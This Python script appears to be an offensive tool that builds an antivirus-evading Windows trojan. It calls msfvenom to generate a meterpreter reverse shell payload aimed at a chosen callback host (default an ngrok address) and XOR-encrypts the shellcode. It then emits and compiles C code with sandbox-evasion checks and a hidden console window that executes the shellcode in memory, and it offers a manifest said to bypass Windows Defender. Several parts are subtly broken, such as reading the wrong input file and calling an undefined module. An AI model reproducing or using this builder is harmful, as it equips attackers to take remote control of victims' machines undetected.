import random 
import string
import os
shellcodeFile='./result/source.py'
fileName='./result/encryptedShellcode.c'
Filename='./result/final'
def banner():
	return """
 ___    ___   __    __   __    ___________    ___     ____________   _______    ____    ____   ________  
|   \  /   | |  |  |  | |  |  |____   ____|  |   |   |____    ____| |  _____|  |    \  |   |  |   ___  \ 
|    \/    | |  |  |  | |  |      |   |      |   |       |   |      |  |___    |     \ |   |  |  |   \  \
|   |\/|   | |  |  |  | |  |      |   |      |   |       |   |      |   ___|   |      \|   |  |  |    |  |
|   |  |   | |  |__|  | |  |____  |   |      |   |       |   |      |  |____   |   |\      |  |  |___/  /
|___|  |___|  \______/  |_______| |___|      |___|       |___|      |_______|  |___| \_____|  |________/
                                                                             
                                                                             
"""
def rand():
	
	return random.choice(string.ascii_lowercase) + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))

def xor(data, key):
	l = len(key)
	keyAsInt = map(ord, key)
	return bytes(bytearray((
	    (data[i] ^ keyAsInt[i % l]) for i in range(0,len(data))
	)))

def writetofile(data, key, cipherType,lport):
	shellcode = "\\x"
	shellcode += "\\x".join(format(ord(b),'02x') for b in data)
	#print shellcode
	global Filename
	list1=[1,2,3,4,5,6,7,8,9,10]
	for i in range(0,10):	
		#print rand()
		list1[i]=rand()
	
	Filename="./result/final_"+lport+".c"
	if shellcode != None:
		try:
			
			f= open(Filename,"w+")
			f.write(("#include <windows.h>\n#include <stdio.h>\n\n"))
			f.write("BOOL "+list1[8]+"() {\nint Tick = GetTickCount();\nSleep(1000);\nint Tac = GetTickCount();\nif ((Tac - Tick) < 1000) {\nreturn 0;}\nelse return 1;\n}\n\n")
			f.write(" int main () { \n HWND hWnd = GetConsoleWindow();\nShowWindow(hWnd, SW_HIDE);\nHINSTANCE DLL = LoadLibrary(TEXT(\""+list1[2]+".dll\"));\nif (DLL != NULL) {\nreturn 0;}\n")
			f.write("if ("+list1[8]+"()) {char * "+list1[4]+" = NULL;\n"+list1[4]+" = (char *)malloc(100000000);\nif ("+list1[4]+" != NULL) {\nmemset("+list1[4]+", 00, 100000000);\nfree("+list1[4]+");\n")
			f.write("\nchar "+list1[3]+"[] = \""+shellcode+"\"; ")
			f.write("\n\nchar "+list1[7]+"[] = \""+key+"\" ;")
			f.write("char "+list1[5]+"[sizeof "+list1[3]+"];\nint j = 0;\nfor (int i = 0; i < sizeof "+list1[3]+"; i++) {\nif (j == sizeof "+list1[7]+" - 1) j = 0;\n"+list1[5]+"[i] = "+list1[3]+"[i] ^ "+list1[7]+"[j];\nj++;\n}\n")
			f.write("void *"+list1[6]+" = VirtualAlloc(0, sizeof "+list1[5]+", MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy("+list1[6]+", "+list1[5]+", sizeof "+list1[5]+");CreateThread(NULL, 0,"+list1[6]+", NULL, 0, NULL);\n\nwhile (1) {\nif (!"+list1[8]+"()) { return 0; }\n}\n}\n}\n}\n")		
			f.close()
			print (("[+] Encrypted Shellcode saved in [{}]".format(Filename)))
		except IOError:
			print (("[!] by sanjam singh  [{}]".format(Filename)))

def color(String, color='none'):
    attr=[]
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

				


if __name__ =='__main__':
	os.system("clear")
	print( banner())
	print("""                                       

       AAAAAA   NN     N TTTTTTTTT IIIII  V         V  IIIII  RRRRR   U      U  SSSSSSS
      A      A  N N    N     T       I     V       V     I    R    R  U      U  S
	  A      A  N  N   N     T       I      V     V      I    RRRRR   U      U  SSSSSSS
	  AAAAAAAA  N   N  N     T       I       V   V       I    RR      U      U        S
	  A      A  N    N N     T       I        V V        I    R  R    U      U        S
	  A      A  N     NN     T     IIIII       V       IIIII  R    R   UUUUUU   SSSSSSS
                                            
""")
	
	
	payload_type=input(color((' [?] Enter Payload TYPE [tcp,https,tcp_dns]: ')))
	if payload_type=="":
		payload_type="tcp"
	print((" [+] Payload TYPE : "+payload_type))
	lhost=input(color(' [?] Enter LHOST for Payload [LHOST] : '))
	if lhost=="":
		lhost="0.tcp.ngrok.io"
	print((" [+] LHOST for Payload [LPORT] : "+lhost))
	lport=input(color(' [?] Enter LPORT for Payload : '))
	print((" [+] LPORT for Payload : "+lport))
	raw_payload='msfvenom -p windows/x64/meterpreter_reverse_'+payload_type+' LHOST='+ lhost +' LPORT='+ lport +' EXITFUNC=process --platform windows -a x64 -f raw -o ./result/test.raw'
	print ('[✔] Checking directories...')
	if not os.path.isdir("./result"):
		os.makedirs("./result")
		print(color("[+] Creating [./result] directory for resulting code files"))
	os.system(raw_payload)
	

	try:
		with open(shellcodeFile) as shellcodeFileHandle:
			shellcodeBytes = bytearray(shellcodeFileHandle.read())
			shellcodeFileHandle.close()
			print (color("[*] Shellcode file [{}] successfully loaded".format(shellcodeFile)))
	except IOError:
		print (color("[!] Could not open or read file [{}]".format(shellcodeFile)))
		quit()

	print (color("[*] MD5 hash of the initial shellcode: [{}]".format(module.new(shellcodeBytes).hexdigest())))
	print (color("[*] Shellcode size: [{}] bytes".format(len(shellcodeBytes))))
	masterKey =input(color(' [?] Enter the Key to Encrypt Shellcode with : '))
	print (color("[+] XOR Encrypting the shellcode with key [{}]".format(masterKey)))
	transformedShellcode = xor(shellcodeBytes, masterKey)
	
	cipherType = 'xor'

	
	print(("[*] Encrypted shellcode size: [{}] bytes".format(len(transformedShellcode))))
	
	# Writing To File 
	
	print("[*] Generating C code file")
	writetofile(transformedShellcode, masterKey, cipherType,lport)
	

	# Compiling
	exe_name='./result/final_'+lport 
	print('[+] Compiling file [{}] with Mingw Compiler '.format(Filename))
	
	j="x86_64-w64-mingw32-gcc {} -o {}.exe".format(Filename,exe_name)
	
	os.system(j)
	print('[+] Compiled Sucessfully')
	print('[+] Removing Temp Files')
	os.remove('./result/test.raw')
	os.remove(Filename)
	
	man='wine mt.exe -manifest template.exe.manifest -outputresource:'+exe_name+'.exe;#1 '
	
	bool =input(color('[*]Do you want to add Manifest (Generally Bypasses Windows Defender)[ Y or N ]?'))
	
	# Display Results
	print("\n===================== RESULT =====================\n")
	if bool:
		print('[+] Adding Manifest ')
		os.system(man)
		print('[+] Final File with Manifest [{}.exe] '.format(exe_name))
	else:
		print('[+] Final File [{}.exe] '.format(exe_name))
	
	print('\n BELEAVE IN US \n',"red")
	print('\n THANKING FOR USING MUTLTITEND\"\n',"green")
	print('\n SYSTEM IS SAFE \n',"green")